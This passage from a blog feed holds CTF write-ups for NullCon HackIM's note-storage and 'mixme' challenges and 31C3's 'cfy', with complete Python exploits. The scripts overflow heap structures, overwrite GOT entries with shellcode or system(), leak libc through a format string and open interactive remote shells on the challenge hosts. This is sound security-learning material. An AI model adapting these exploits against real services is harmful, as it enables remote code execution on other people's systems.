<p>When I know requested the value of note one, the binary would dump out lots of B&rsquo;s, but also append the pointers from the heap! With that sorted, I could find my shellcode on the heap even with ASLR enabled. Next was overwriting a GOT pointer. This was done by overflowing a note and overwriting the pointers to <code>next_note</code> and <code>prev_note</code>. Then I&rsquo;d ask the binary to delete a note. It does this by calling <code>free()</code>. Because we can control the two pointers, we have a write-what-where primitive. By setting the right values, I could write the address of the shellcode on the heap to <code>__isoc99_scanf@got.plt</code>. Initially, I swapped the two memory addresses around, leading to mangled shellcode. After overwriting the GOT pointer of <code>__isoc99_scanf@got.plt</code>, which is one of the next functions the binary calls in its main loop, the shellcode on the heap is executed. Because of the way <code>free()</code> works, we need to adjust the addresses a bit.</p>

<p>The <a href="http://www.shell-storm.org/shellcode/files/shellcode-547.php">shellcode</a> was modified a bit (&lsquo;/bin/ash&rsquo; -> &lsquo;/bin//sh&rsquo;) and stored on the heap. The overflow was used to overwrite the two pointers, and the write-what-where is triggered by sending a &lsquo;delete note&rsquo; command.</p>

<p>The exploit:</p>

<pre><code class="python">import struct
import socket
import time
import re

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('54.163.248.69', 9004))

s.recv(1000)
time.sleep(0.5)

def p(x):
    return struct.pack('&lt;L', x)

payload  = "1\n1\n1\n1\n"   # create two notes of type one
payload += "3\n0\n2\n"      # edit note 0 as type two

s.send(payload)
time.sleep(0.5)

# overflow note to line up to heap pointer
s.send("A"*212+"BBB\n")

time.sleep(0.5)
s.recv(256)

# leak heap addr
print "[+] Trying to leaking heap address..."
time.sleep(0.5)

s.send("4\n0\n")
time.sleep(0.5)

data = s.recv(1000)

# ugly.. but works :/
m = re.search(r'.*BBB\n(....).*', data)
if m:
    heap = struct.unpack('&lt;L', m.group(1))[0]
    print "[+] Leaked heap address at {}".format(hex(heap))
    # offset for shellcode found empirically via gdb
    shellcode = heap - 0xd0
    print "[+] Shellcode at {}".format(hex(shellcode))
else:
    print "[!] Fatal: could not leak heap address"
    exit(0)

time.sleep(0.5)
print "[+] Sending new notes to overwrite got pointer..."
s.send("1\n1\n1\n1\n")  # create two more notes
time.sleep(0.5)
s.recv(1000)

# send new note to overflow pointers
s.send("3\n2\n2\n")
time.sleep(0.5)
s.recv(1000)

time.sleep(0.5)
payload = ""
sc = "\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"
# prepend shellcode with a little NOP sled
payload += "\x90"*(212-len(sc))
payload += sc
# overwrite note_info struct
payload += p(0x804b024-8)     # __isoc99_scanf@got.plt-8
payload += p(shellcode)       # heap location of shellcode

payload += "\n"
s.send(payload)

# request deletion of a note, triggering our write-what-where
# we overwrite a function pointer in the got with the location
# of our shellcode
time.sleep(0.5)
s.send("2\n3\n")

time.sleep(0.5)
s.recv(512)

# shell incoming!
print "[+] Enjoy your shell!"

import telnetlib
t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()
</code></pre>

<pre><code>bas@tritonal:~/tmp/nullcon/exp400$ python sploit.py 
[+] Trying to leaking heap address...
[+] Leaked heap address at 0x85cf1d0
[+] Shellcode at 0x85cf100
[+] Sending new notes to overwrite got pointer...
[+] Enjoy your shell!
id
/bin//sh: 1: id: not found
cat flag.txt
flag{y0u_br0k3_1n70_5h3rl0ck_m1ndp4l4c3}
</code></pre>

<p>The flag was <code>flag{y0u_br0k3_1n70_5h3rl0ck_m1ndp4l4c3}</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[HackIM CTF - Mixme]]></title>
    <link href="http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mixme-writeup/"/>
    <updated>2015-01-11T18:52:35+01:00</updated>
    <id>http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mixme-writeup</id>
    <content type="html"><![CDATA[<p><code>mixme</code> was a 400 points exploitation challenge of the NullCon HackIM ctf. We solved it with just 20 minutes on the clock!</p>

<!-- more -->


<p>When started, <code>mixme</code> present the following:</p>

<pre><code>==========================================
======== Uncle Podger's Data Store =======
==========================================

Select op (store/get/edit/exit): store
Name: a
Size: 4
Enter data: AAAA
Select op (store/get/edit/exit): get
Name: a
Size: 4
AAAASelect op (store/get/edit/exit): get
Name: a
Size: 4
Not found
Select op (store/get/edit/exit): Invalid input
Select op (store/get/edit/exit): 
</code></pre>

<p>Again, some kind of note storage. The binary was first reverse-engineered by superkojiman, who immediately noticed something odd: upon <code>get</code>ing a note, the program erases the note by <code>free()</code>ing the memory and NULLing the first few bytes. The rest of the bytes were left intact. This led us to think about possible use-after-free scenarios. Turns out it was something different&hellip;</p>

<p>I started tinkering with the binary. I could store notes and get them back, but only if I supplied the right size. However, I noticed that I could <em>edit</em> a note with a larger value than was allocated. The heap looks like this after allocating three notes <code>a</code>, <code>b</code> and <code>c</code> with length 4 and contents <code>AAAA</code>, <code>BBBB</code>, and <code>CCCC</code>, respectively:</p>

<pre><code># allocated three notes, in heap:
0x8314000:  0x00000000  0x00000029  0x44414548  0x00000000
0x8314010:  0x00000000  0x00000000  0x00000000  0x00000000
0x8314020:  0x08314030  0x083140a0  0x00000000  0x00000029
0x8314030:  0x00000061  0x00000000  0x00000000  0x00000000
0x8314040:  0x00000004  0x08314058  0x08314068  0x08314008
0x8314050:  0x00000000  0x00000011  0x41414141  0x00000000
0x8314060:  0x00000000  0x00000029  0x00000062  0x00000000
0x8314070:  0x00000000  0x00000000  0x00000004  0x08314090
0x8314080:  0x083140a0  0x08314030  0x00000000  0x00000011
0x8314090:  0x42424242  0x00000000  0x00000000  0x00000029
0x83140a0:  0x00000063  0x00000000  0x00000000  0x00000000
0x83140b0:  0x00000004  0x083140c8  0x08314008  0x08314068
0x83140c0:  0x00000000  0x00000011  0x43434343  0x00000000
0x83140d0:  0x00000000  0x00020f31  0x00000000  0x00000000
0x83140e0:  0x00000000  0x00000000  0x00000000  0x00000000
</code></pre>

<p>At <code>0x8314030</code>, we see the first note&rsquo;s name, <code>a</code>. The zeroeth note is called <code>HEAD</code> and precedes our first note. Each note is contained within a struct, which contains pointers to the previous and next note (a doubly linked list). The meta-data for note <code>a</code> contains this pointer: <code>0x08314058</code>, which points to the data associated with that note: <code>AAAA</code>. The meta-data for the note looks something like this:</p>

<pre><code class="c">note_info struct {
    char name[16];
    int length;
    char *content;
    note_info *next_note;
    note_info *prev_note;
};
</code></pre>

<p>This also is true for the next note, <code>b</code>, which is immediately after <code>a</code> in memory. We can overwrite the meta-data of note <code>b</code> by editing note <code>a</code>.</p>

<h2>Overflowing the heap</h2>

<p>If we supply 40 bytes when editing <code>a</code> and supplying forty times <code>0x41</code>, we overwrite several parts of the meta-data of note <code>b</code>:</p>

<pre><code># after editing 'a' with 40 bytes where 4 is allocated:
0x8314000:  0x00000000  0x00000029  0x44414548  0x00000000
0x8314010:  0x00000000  0x00000000  0x00000000  0x00000000
0x8314020:  0x083140a0  0x083140a0  0x00000000  0x00000029
0x8314030:  0x00000061  0x00000000  0x00000000  0x00000000
0x8314040:  0x00000004  0x08314058  0x08314068  0x08314008
0x8314050:  0x00000000  0x00000011  0x41414141  0x41414141
0x8314060:  0x41414141  0x41414141  0x41414141  0x41414141
0x8314070:  0x41414141  0x41414141  0x41414141  0x41414141
0x8314080:  0x083140a0  0x08314008  0x00000000  0x00000011
0x8314090:  0x42424242  0x42424242  0x42424242  0x42424242
0x83140a0:  0x42424242  0x42424242  0x42424242  0x42424242
0x83140b0:  0x42424242  0x083140c8  0x08314008  0x08314008
0x83140c0:  0x00000000  0x00000011  0x43434343  0x00000000
0x83140d0:  0x00000000  0x00020f31  0x00000000  0x00000000
0x83140e0:  0x00000000  0x00000000  0x00000000  0x00000000
</code></pre>

<p>If we now try to <code>get</code> note <code>b</code>, the binary will segfault because the pointer to the note&rsquo;s data is set to <code>0x41414141</code>. We can use this to make note <code>b</code> point to <code>free@got</code> with a bit of python. The binary is started using socat to make it listen on a port.</p>

<pre><code># set 'a' with large buffer, overwriting meta-data of 'b':
0x8314000:  0x00000000  0x00000029  0x44414548  0x00000000
0x8314010:  0x00000000  0x00000000  0x00000000  0x00000000
0x8314020:  0x083140a0  0x083140a0  0x00000000  0x00000029
0x8314030:  0x00000061  0x00000000  0x00000000  0x00000000
0x8314040:  0x00000004  0x08314058  0x08314068  0x08314008
0x8314050:  0x00000000  0x00000011  0x41414141  0x41414141
0x8314060:  0x41414141  0x00000029  0x00000062  0x41414141
0x8314070:  0x41414141  0x41414141  0x00000024  0x08314090
0x8314080:  0x083140a0  0x08314008  0x00000000  0x00000011
0x8314090:  0x42424242  0x42424242  0x42424242  0x42424242
0x83140a0:  0x42424242  0x42424242  0x42424242  0x42424242
0x83140b0:  0x42424242  0x083140c8  0x08314008  0x08314008
0x83140c0:  0x00000000  0x00000011  0x43434343  0x00000000
0x83140d0:  0x00000000  0x00020f31  0x00000000  0x00000000
0x83140e0:  0x00000000  0x00000000  0x00000000  0x00000000
</code></pre>

<p>Notice that I&rsquo;ve kept the bytes at <code>0x8314064</code> and <code>0x8314068</code> the same: <code>0x00000029 0x00000062</code>. If these are overwritten, then the binary cannot find note <code>b</code> anymore, which effectively stops our attack! I overwrote the pointer to the data with <code>0x804b020</code>. This is the pointer to <code>free()</code> in the Global Offset Table. Remember, after every <code>get</code> sent to the binary, <code>free()</code> is called. By overwriting the pointer to the note data, we can set any memory to arbitrary values with an <code>edit b</code> command to the binary!</p>

<h2>Control of execution</h2>

<p>I tested this hypothesis with the following python:</p>

<pre><code class="python">import re
import string
import struct
import socket
import time
import telnetlib
import sys

def p(x):
    return struct.pack('&lt;L', x)

# function to send commands to the binary
def z(sock, x):
    sock.send(x + '\n')
    time.sleep(0.01)
    data = sock.recv(200)
    time.sleep(0.01)
    return data

# connect to remote host
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 9005))

# receive banner
s.recv(512)

# ask the binary to store three notes
# we'll overflow a into b later on
z(s, "store")
z(s, "a")
z(s, "4")
z(s, "AAAA")

z(s, "store")
z(s, "b")
z(s, "4")
z(s, "BBBB")

z(s, "store")
z(s, "c")
z(s, "4")
z(s, "CCCC")

# edit a with a large value
# this overflows and overwrites the note_info struct of b
# the pointer to the data is overwriting with free@got
print "[+] overflowing a to set b to free@got"
z(s, 'edit')
z(s, 'a')
z(s, '40')
z(s, "A"*12+"\x29\x00\x00\x00\x62\x00\x00\x00"+"A"*12+p(4)+p(0x804b020))
#     ^ overflow    ^ restore 0x29, 'b'               ^ size of b ^ free@got

# overwrite free@got with printf
print "[+] replacing free() with printf()"
z(s, 'edit')
z(s, 'b')
z(s, '4')
z(s, 'BBBB')

z(s, 'get')
z(s, 'c')
z(s, '4')
</code></pre>

<p>This made the binary crash. The coredump reported the following:</p>

<pre><code class="python">#0  0x42424242 in ?? ()
gdb-peda$ i r
eax            0x843b0c8    0x843b0c8
ecx            0x843b0c8    0x843b0c8
edx            0x4  0x4
ebx            0xb779cff4   0xb779cff4
esp            0xbf95245c   0xbf95245c
ebp            0xbf952498   0xbf952498
esi            0x0  0x0
edi            0x0  0x0
eip            0x42424242   0x42424242
eflags         0x10207  [ CF PF IF RF ]
cs             0x73 0x73
ss             0x7b 0x7b
ds             0x7b 0x7b
es             0x7b 0x7b
fs             0x0  0x0
gs             0x33 0x33
gdb-peda$ p system
$1 = {&lt;text variable, no debug info&gt;} 0xb7636060 &lt;system&gt;
gdb-peda$ x/4x $esp
0xbf95245c: 0x08048bb8  0x0843b0c8  0x0843b0c8  0x00000004

gdb-peda$ x/4x $eax
0x843b0c8:  0x43434343  0x00000000
</code></pre>

<p>Bloody awesome! We not only have control over EIP, but also eax, ecx and the first argument on the stack point to memory that we control. This will come in handy later.</p>

<h2>Turning the heap overflow into a format string vulnerability</h2>

<p>With what should I overwrote the got pointer to <code>free()</code> though? I looked for ROP gadgets, but there weren&rsquo;t enough to pivot the stack into the heap and spawn a shell, or open/read/write the flag to stdout. Furthermore, I assumed ASLR was enabled so I had to leak libc addresses first.</p>

<p>After thinking about it, I chose to overwrite <code>free@got</code> with <code>printf@plt</code>. This turns the heap overflow into a format string vulnerability! Maybe this is where the challenge name comes from&hellip;</p>

<p>After setting <code>free@got</code> to <code>printf@plt</code>, whenever I ask the binary to <code>get</code> a note, I can print whatever content is associated with that note (because <code>free()</code> is called with the pointer to the content of the note).</p>

<p>I examined the stack by supplying a format string consisting of a bunch of <code>%x</code>&rsquo;s. Obviously, I couldn&rsquo;t dig up my own format string from the stack, because the format string itself is on the heap!</p>

<h2>What&rsquo;s that gem?</h2>

<p>Examining the stack, I dumped the following data:</p>

<pre><code># local binary
85850c8-122-b75c77b0-122-85850a0-85850a0-63... &lt;snip&gt;
</code></pre>

<p>That third address looks promising! It points into <code>libc</code>. Unfortunately, there&rsquo;s a problem. Running the script against the server gave a different address:</p>

<pre><code># remote binary
83370c8-122-b75c0024-122-83370a0-83370a0-b7000063-... &lt;snip&gt;
936e0c8-122-b764a024-122-936e0a0-936e0a0-b7000063-... &lt;snip&gt;
</code></pre>

<p>We notice two things: ALSR is on and the remote binary seems to have a different libc than my local box (which was an Ubuntu 12.04 VM). I turned the format string into <code>%3$s</code> to find out which bytes were on the local and remote libc address. For the local binary, it returned <code>0x168bc085</code>. For the remote binary, however, it returned <code>0x7501c083</code>. These differences pointed towards different versions of libc. This was a nightmare! How am I supposed to find anything useful in libc without access to the specific library?</p>

<h2>Finding the correct libc</h2>

<p>I decided to try and identify the libc version. With less than 60 minutes to go, I went for it. If I had the right version of libc, I had everything to leak a libc address, add an offset to get <code>system()</code> and spawn a shell. I tried to nmap the remote server, which seemed too slow. However, <code>ssh</code> was enabled:</p>

<pre><code class="bash">bas@tritonal:~/tmp/nullcon/mixme$ ssh test@54.163.248.69 -vvv
OpenSSH_6.0p1 Debian-4+deb7u2, OpenSSL 1.0.1e 11 Feb 2013
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: /etc/ssh/ssh_config line 19: Applying options for *
debug2: ssh_connect: needpriv 0
debug1: Connecting to 54.163.248.69 [54.163.248.69] port 22.
debug1: Connection established.
debug1: identity file /home/bas/.ssh/id_rsa type -1
debug1: identity file /home/bas/.ssh/id_rsa-cert type -1
debug1: identity file /home/bas/.ssh/id_dsa type -1
debug1: identity file /home/bas/.ssh/id_dsa-cert type -1
debug1: identity file /home/bas/.ssh/id_ecdsa type -1
debug1: identity file /home/bas/.ssh/id_ecdsa-cert type -1
debug1: Remote protocol version 2.0, remote software version OpenSSH_6.6.1p1 Ubuntu-2ubuntu2
&lt;snip&gt;
</code></pre>

<p>Googling <code>OpenSSH_6.6.1p1 Ubuntu-2ubuntu2</code> led me to believe that Ubuntu 14.04 was being run. I downloaded all the i386 libc version I could find, unpacked them and searched them for the bytes I just leaked:</p>

<pre><code class="bash">bas@tritonal:~/tmp/nullcon/mixme/libc$ for i in `ls`; do echo $i; echo; xxd $i | egrep '83.?c0.?01.?75'; echo; done


libc-2.15-0ubuntu10.9.so

0043740: 8934 24e8 f8f4 0200 83c0 0175 b0c7 8570  .4$........u...p
00460a0: 0000 0089 3424 e895 cb02 0083 c001 75bb  ....4$........u.
0046720: 0200 83c0 0175 80c7 8570 fbff ffff ffff  .....u...p......
0046810: 2cc4 0200 83c0 0175 a5c7 8570 fbff ffff  ,......u...p....
0046890: e8ab c302 0083 c001 75ac c785 70fb ffff  ........u...p...
0047320: 4424 04e8 18b9 0200 83c0 0175 80c7 8570  D$.........u...p
0047410: 0000 0089 3424 e825 b802 0083 c001 75a4  ....4$.%......u.
005a180: 83c0 0175 a4c7 85b0 efff ffff ffff ffe9  ...u............
005b410: 3424 e8f9 1001 0083 c001 75ae c785 b0ef  4$........u.....
005c370: 0089 3424 e897 0101 0083 c001 7580 c785  ..4$........u...
00674c0: 0a00 0000 8904 24e8 74b7 0000 83c0 0175  ......$.t......u

libc-2.16-0ubuntu6.so

0047b50: 83c0 0175 a8e9 97bf ffff 81e1 ff00 0000  ...u............
005ad90: 0083 c001 75b9 e95b ccff ff8b 4d10 8b45  ....u..[....M..E
0066ab0: 7cb4 0000 83c0 0175 918d b426 0000 0000  |......u...&amp;....

libc-2.19-0ubuntu6.4.so

00471c0: 0489 3424 e817 9e02 0083 c001 758a e9d1  ..4$........u...
0047920: 24e8 ba96 0200 83c0 0175 c5e9 74c2 ffff  $........u..t...
005a850: 8904 24e8 d801 0100 83c0 0175 b8e9 04cc  ..$........u....
005b3a0: 83c0 0175 c9e9 bcc0 ffff a810 8d74 2600  ...u.........t&amp;.
0066020: bcaf 0000 83c0 0175 988d b426 0000 0000  .......u...&amp;....

libc-2.19-13ubuntu3.so

00472a0: 0489 3424 e877 9c02 0083 c001 758a e9d1  ..4$.w......u...
0047a00: 0000 8934 24e8 1695 0200 83c0 0175 c5e9  ...4$........u..
0050e40: 8904 24e8 6879 0100 83c0 0175 b8e9 04cc  ..$.hy.....u....
0051990: 83c0 0175 c9e9 bcc0 ffff a810 8d74 2600  ...u.........t&amp;.
0066100: 1cae 0000 83c0 0175 988d b426 0000 0000  .......u...&amp;....
</code></pre>

<p>I struck gold with libc-2.19-0ubuntu6.4.so:</p>

<pre><code>0066020: bcaf 0000 83c0 0175 988d b426 0000 0000  .......u...&amp;....
</code></pre>

<p>Those bytes (0x7501c083) where at an offset of <code>xxxx6024</code> in the binary, which looked very much like the third address on the stack dumped from the remote binary. This had to be the right libc version! I loaded up the binary on my Ubuntu VM with libc-2.19-0ubuntu6.4.so:</p>

<pre><code class="bash">LD_PRELOAD=./libc-2.19-0ubuntu6.14.so ./mixme
</code></pre>

<p>and attached <code>gdb</code> to dump the address of <code>system()</code>. Using the aforementioned value from the stack, I calculated the offset to <code>system()</code>. I quickly modified my script to include this, overwriting <code>free@got</code> with <code>system()</code>. When I now made a note with the value <code>/bin/sh</code> and asked the binary to <code>get</code> that note, it wants to <code>free()</code> it. However, <code>free@got</code> is replaced with system(), effectively making the binary call <code>system('/bin/sh');</code>!</p>

<p>So, in true dirty-ctf-style, the following python script was written after hours of frantic tracing with gdb and coding in python.</p>

<pre><code class="python">import re
import string
import struct
import socket
import time
import telnetlib
import sys

def p(x):
    return struct.pack('&lt;L', x)

# function to send commands to the binary
def z(sock, x):
    sock.send(x + '\n')
    time.sleep(0.01)
    data = sock.recv(200)
    time.sleep(0.01)
    return data

# connect to remote host
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('54.163.248.69', 9005))

# receive banner
s.recv(512)

# ask the binary to store three notes
# we'll overflow a into b later on
z(s, "store")
z(s, "a")
z(s, "4")
z(s, "AAAA")

z(s, "store")
z(s, "b")
z(s, "4")
z(s, "BBBB")

# the third note will hold our format string
z(s, "store")
z(s, "c")
format_str = "--%3$x"
z(s, str(len(format_str)))
z(s, format_str)

# edit a with a large value
# this overflows and overwrites the note_info struct of b
# the pointer to the data is overwriting with free@got
print "[+] overflowing a to set b to free@got"
z(s, 'edit')
z(s, 'a')
z(s, '40')
z(s, "A"*12+"\x29\x00\x00\x00\x62\x00\x00\x00"+"A"*12+p(4)+p(0x804b020))
#     ^ overflow    ^ restore 0x29, 'b'               ^ size of b ^ free@got

# overwrite free@got with printf
print "[+] replacing free() with printf()"
z(s, 'edit')
z(s, 'b')
z(s, '4')
z(s, p(0x080485f0)) # free@got overwritten with printf

# now 'get' c and trigger the format string vulnerability
print "[+] triggering format string"
z(s, "get")
z(s, "c")
data = z(s, str(len(format_str)))
time.sleep(0.1)

# this proved to be a bit finicky:
data += s.recv(256)
data += s.recv(256)

print data
# grab leaked libc address
m = re.findall(r'x--(.*)cSel', data)
if m: 
    print m
    leak = "0x"+m[0]
    leak_hex = int(leak, 16)
    print "[+] found first addr: {}".format(hex(leak_hex))
    system = leak_hex - 155428
    print "[+] system @ {}".format(hex(system))

# repeat the same trick, but this time, overwrite free@got with system()
# first note contains /bin/sh, used as argument for system()
z(s, "store")
z(s, "sh")
z(s, "7")
z(s, "/bin/sh")

z(s, "store")
z(s, "t")
z(s, "4")
z(s, "TTTT")

z(s, "store")
z(s, "q")
z(s, "4")
z(s, "QQQQ")

print "[+] overflowing t to set q to free@got"
z(s, 'edit')
z(s, 't')
z(s, '40')
z(s, "A"*12+"\x29\x00\x00\x00\x71\x00\x00\x00"+"A"*12+p(4)+p(0x804b020))
#     ^ overflow              ^ restore 'q'           ^ size of q  ^ free@got

print "[+] replacing free() with system()"
z(s, 'edit')
z(s, 'q')
z(s, '4')
z(s, p(system))     # free@got overwritten with system

# trigger system('/bin/sh')
z(s, 'get')
z(s, 'sh')  # this note contains '/bin/sh' and those contents are passed to system()
z(s, '7')

# shell spawned, interact with it!
t=telnetlib.Telnet()
t.sock=s
t.interact()

s.close()
</code></pre>

<p>I ran it, and to my surprise, I got it right the first time! I dropped into a shell on the remote box:</p>

<pre><code class="bash">root@ubuntu-VirtualBox:/home/ubuntu/nullcon/mixme# python exploit.py
[+] overflowing a to set b to free@got
[+] replacing free() with printf()
[+] triggering format string
Name: Size: --%3$x--b768d024cSelect op (store/get/edit/exit): 
['b768d024']
[+] found first addr: 0xb768d024L
[+] system @ 0xb7667100L
[+] overflowing t to set q to free@got
[+] replacing free() with system()
/bin/sh
id
uid=1005 gid=1005 groups=0
cat flag.txt
aw3s0m3++_hipp1e_pwn_r0ckst4r
</code></pre>

<p>The flag was <code>aw3s0m3++_hipp1e_pwn_r0ckst4r</code>. This one was really though and I&rsquo;m glad I managed to beat it with just 20 minutes left for the ctf!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[31C3 CTF - Cfy]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/29/31c3-ctf-cfy/"/>
    <updated>2014-12-29T12:06:07+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/29/31c3-ctf-cfy</id>
    <content type="html"><![CDATA[<p>Man, 31C3 CTF was tough. I managed to get this flag, worth 10 points. Seems I need to keep learning ;] Let&rsquo;s have a look at <code>cfy</code>.</p>

<!-- more -->


<p></p>

<p>We&rsquo;re given the binary and a place to connect to. Upon connecting with <code>nc</code>, we see the following:</p>

<pre><code class="bash">bas@tritonal:~/tmp/31c3$ nc 188.40.18.73 3313
What do you want to do?
0) parse from hex
1) parse from dec
2) parse from pointer
3) quit
</code></pre>

<p>With option 2, we have an arbitrary read ability, but we have to pass in the pointer in raw hex. This allows us to leak a <code>libc</code> address from the GOT. I chose to leak <code>printf</code> because I figured that one would have been resolved by the time our input was handled.</p>

<p>Finding the address of <code>printf</code> pointer in GOT was done like this:</p>

<pre><code class="bash">bas@tritonal:~/tmp/31c3/cfy$ objdump -d -M intel ./cfy |grep "printf" -A2 
00000000004005e0 &lt;printf@plt&gt;:
  4005e0:   ff 25 3a 0a 20 00       jmp    QWORD PTR [rip+0x200a3a]        # 601020 &lt;_GLOBAL_OFFSET_TABLE_+0x20&gt;
  4005e6:   68 01 00 00 00          push   0x1
</code></pre>

<p>So the pointer to <code>printf</code> is located at <code>0x601020</code> in the binary. This script grabs that value via the &ldquo;parse from pointer&rdquo; option:</p>

<pre><code class="python">#!/usr/bin/python

import struct 
import time
import socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('188.40.18.73', 3313))


def p(x):
    return struct.pack("L", x)

addr = 0x601020

payload = ""
payload += "2\n"
payload += p(addr)  # printf
payload += "\n"

print s.recv(1000)
s.send(payload)
time.sleep(0.5)
print s.recv(1000)
</code></pre>

<p>Which gives us the output:</p>

<pre><code class="bash">bas@tritonal:~/tmp/31c3/cfy$ python read.py 
What do you want to do?
0) parse from hex
1) parse from dec
2) parse from pointer
3) quit


Please enter your number: dec: 140512731112416
hex: 0x7fcbab6ca3e0

What do you want to do?
0) parse from hex
1) parse from dec
2) parse from pointer
3) quit
</code></pre>

<p>Unfortunately, running the python script again shows a different address for <code>printf</code>. This means that ASLR is enabled. Furthermore, I didn&rsquo;t know what version of <code>libc</code> was running!</p>

<p>I turned my attention to gaining code execution. This was more trivial, although it wasn&rsquo;t a straight-forward buffer overflow. The binary asks the user for a choice. That choice is converted from a string to an int. From this int, the binary looks up the relevant code to handle the request:</p>

<pre><code>  4008af: 48 c1 e0 04           shl    rax,0x4         ; multiply value by 16
  4008b3: 48 05 80 10 60 00     add    rax,0x601080    ; address of parsers, see below
  4008b9: 48 8b 00              mov    rax,QWORD PTR [rax]
  4008bc: bf e0 10 60 00        mov    edi,0x6010e0    ; address of buf, see below
  4008c1: ff d0                 call   rax             ; gain code exec here!
</code></pre>

<p>There is no check performed on the value in <code>rax</code>. If we pass in a normal value, like <code>2</code>, the binary fetches the corresponding parser here:</p>

<pre><code>gdb-peda$ p parsers
$1 = { {
    fn = 0x40073d &lt;from_hex&gt;, 
    desc = 0x4009b4 "parse from hex"
  }, {
    fn = 0x400761 &lt;from_dec&gt;, 
    desc = 0x4009c3 "parse from dec"
  }, {
    fn = 0x400785 &lt;from_ptr&gt;, 
    desc = 0x4009d2 "parse from pointer"
  } }
</code></pre>

<p>But look here: <code>buf</code> is almost right behind <code>parsers</code>:</p>

<pre><code class="">gdb-peda$ x/40wx parsers
0x601080 &lt;parsers&gt;:             0x0040073d  0x00000000  0x004009b4  0x00000000
0x601090 &lt;parsers+16&gt;:          0x00400761  0x00000000  0x004009c3  0x00000000
0x6010a0 &lt;parsers+32&gt;:          0x00400785  0x00000000  0x004009d2  0x00000000
0x6010b0:                       0x00000000  0x00000000  0x00000000  0x00000000
0x6010c0 &lt;stdout@@GLIBC_2.2.5&gt;: 0xf7dd77a0  0x00007fff  0xf7dd76c0  0x00007fff
0x6010d0 &lt;completed.6972&gt;:      0x00000000  0x00000000  0x00000000  0x00000000
0x6010e0 &lt;buf&gt;:                 0x00000000  0x00000000  0x00000000  0x00000000
0x6010f0 &lt;buf+16&gt;:              0x00000000  0x00000000  0x00000000  0x00000000
0x601100 &lt;buf+32&gt;:              0x00000000  0x00000000  0x00000000  0x00000000
0x601110 &lt;buf+48&gt;:              0x00000000  0x00000000  0x00000000  0x00000000
</code></pre>

<p>If we somehow load <code>buf</code> with pointers to code we want to execute, then pass in a large value at the prompt, the code will fetch the parser address from the <code>buf</code> section and we have control over execution:</p>

<pre><code class="bash">gdb-peda$ r
What do you want to do?
0) parse from hex
1) parse from dec
2) parse from pointer
3) quit
7   # give bigger number!

Please enter your number: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x6161616161616161 ('aaaaaaaa')
RBX: 0x0 
RCX: 0xfbad2288 
RDX: 0x6010e0 ('a' &lt;repeats 52 times&gt;, "\n")
RSI: 0x7ffff7ff7035 --&gt; 0x0 
RDI: 0x6010e0 ('a' &lt;repeats 52 times&gt;, "\n")
RBP: 0x7fffffffe4b0 --&gt; 0x0 
RSP: 0x7fffffffe4a0 --&gt; 0x7ffffe590 
...snip...
[-------------------------------------code-------------------------------------]
   0x4008b3 &lt;main+167&gt;: add    rax,0x601080
   0x4008b9 &lt;main+173&gt;: mov    rax,QWORD PTR [rax]
   0x4008bc &lt;main+176&gt;: mov    edi,0x6010e0
=&gt; 0x4008c1 &lt;main+181&gt;: call   rax
   0x4008c3 &lt;main+183&gt;: mov    QWORD PTR [rbp-0x8],rax
   0x4008c7 &lt;main+187&gt;: mov    rax,QWORD PTR [rbp-0x8]
   0x4008cb &lt;main+191&gt;: mov    rsi,rax
   0x4008ce &lt;main+194&gt;: mov    edi,0x400a3d
Guessed arguments:
arg[0]: 0x6010e0 ('a' &lt;repeats 52 times&gt;, "\n")
..snip...
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004008c1 in main ()
</code></pre>

<p>Excellent. Now what pointer should we store in <code>buf</code>? I couldn&rsquo;t make a ROP chain, for I had no control over the stack. The obvious thing to do was to return to <code>system()</code> with <code>/bin/sh</code> as argument. But where was <code>system()</code> located?</p>

<p>I had no idea what <code>libc</code> version was running. I did have an arbitrary read primitive though. I had downloaded <code>libc-2.19</code> and from the addresses of <code>printf</code> and <code>puts</code> (both available in the GOT) I deduced that this <em>wasn&rsquo;t</em> the correct version. However, I decided to scan the remote binary&rsquo;s libc for signature bytes of <code>system()</code>. I assumed it started with these bytes:</p>

<pre><code>bas@tritonal:~/tmp/31c3/cfy$ gdb ./libc-2.19.so 
GNU gdb (GDB) 7.4.1-debian
...snip...
gdb-peda$ x/8b system
0x46530 &lt;system&gt;:   0x48    0x85    0xff    0x74    0xb 0xe9    0x26    0xfb
</code></pre>

<p>So I wrote a small scanner in python. This scanner will dump bytes from libc, searching for <code>ff85</code> in the output.</p>

<pre><code class="python">#!/usr/bin/python

import struct, time, re

def p(x):
    return struct.pack("L", x)

payload = ""
payload += "2\n"
payload += p(0x601020)  # printf
payload += "\n"

import socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('188.40.18.73', 3313))

print s.recv(1025)
s.send(payload)
time.sleep(1.5)
data = s.recv(1000)

PRINTF = -1
print data
m = re.search(r'hex: (.*)', data)
if m:
    PRINTF = m.group(1)

OFFSET=63580    # guesstimated from real libc
for i in range(5000):
    payload = ""
    payload += "2\n"
    payload += p(int(PRINTF, 16)-OFFSET-i)
    payload += "\n"

    s.send(payload)

    data = s.recv(200)
    print data
    print i

    if 'ff85' in data: # part of test rdi, rdi
            print "[!] found possible offset for system(): printf-%d" % (int(PRINTF,16)-(int(PRINTF, 16)-OFFSET-i))
            print "[!] system @ %s" % hex(int(PRINTF, 16)-OFFSET-i)
            raw_input()
</code></pre>

